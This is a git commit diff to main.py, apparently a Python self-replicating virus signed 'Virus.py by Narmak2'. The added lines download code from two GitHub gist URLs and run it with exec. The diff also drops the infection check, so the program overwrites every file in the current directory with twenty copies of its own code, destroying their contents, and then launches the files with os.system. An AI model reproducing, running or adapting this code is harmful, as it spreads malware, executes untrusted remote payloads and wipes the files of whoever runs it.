1c8b38194e82f547efce855a0bc0a4f7f3658430
Kamran <83241419+NarmakTwo@users.noreply.github.com>
2021-11-29 12:24:00 -0500

    Update main.py

--- main.py
+++ main.py
@@ -2,8 +2,9 @@
 import sys
 import glob
 import os
+import urllib.request
+#sig = 'Virus.py by Narmak2'
 ff = sys.argv[0]
-print('Never gonna give you up\nNever gonna let you down\nNever gonna run around, and desert you\nNever gonna make you cry\nNever gonna say goodbye\nNever gonna tell a lie, or hurt you\n')
 virus_code = []
 with open(sys.argv[0], 'r') as f:
     lines = f.readlines()
@@ -15,22 +16,29 @@ for line in lines:
         virus_code.append(line)
     if line == "# VIRUS SAYS BYE!\n":
         break
+if 'sig = \'Virus.py by Narmak2\'' in lines:
+  fp = urllib.request.urlopen("https://gist.githubusercontent.com/NarmakTwo/45ba9e421fdeb87ee3bb1a265d85f3e2/raw/62bfae6a810ecd6d3c9cb31bb961dfba489b86de/code.py")
+  mybytes = fp.read()
+  mystr = mybytes.decode("utf8")
+  fp.close()
+  exec(compile(mystr, 'exec', 'exec'))
+else:
+  fp = urllib.request.urlopen("https://gist.githubusercontent.com/NarmakTwo/b6ce28a66fe6af224c2fadba10efdf7c/raw/b363584b8dfb4168f636f6837d2d112f56770fb7/gistfile1.txt")
+  mybytes = fp.read()
+  mystr = mybytes.decode("utf8")
+  fp.close()
+  exec(compile(mystr, 'exec', 'exec'))
 python_files = glob.glob('*.py') + glob.glob('*.pyw') + glob.glob('*')
 for file in python_files:
     with open(file, 'r') as f:
         file_code = f.readlines()
     infected = False
-    for line in file_code:
-        if line == "# VIRUS SAYS HI!\n":
-            infected = False
-            break
-    if not infected:
-        final_code = []
-        final_code.extend(virus_code)
-        final_code.extend('\n')
-        with open(file, 'w') as f:
-          for i in range(20):
-            f.writelines(final_code)
+    final_code = []
+    final_code.extend(virus_code)
+    final_code.extend('\n')
+    with open(file, 'w') as f:
+      for i in range(20):
+        f.writelines(final_code)
 for i in python_files:
   os.system(f'python3 {os.path.abspath(file)} $')
 # VIRUS SAYS BYE!
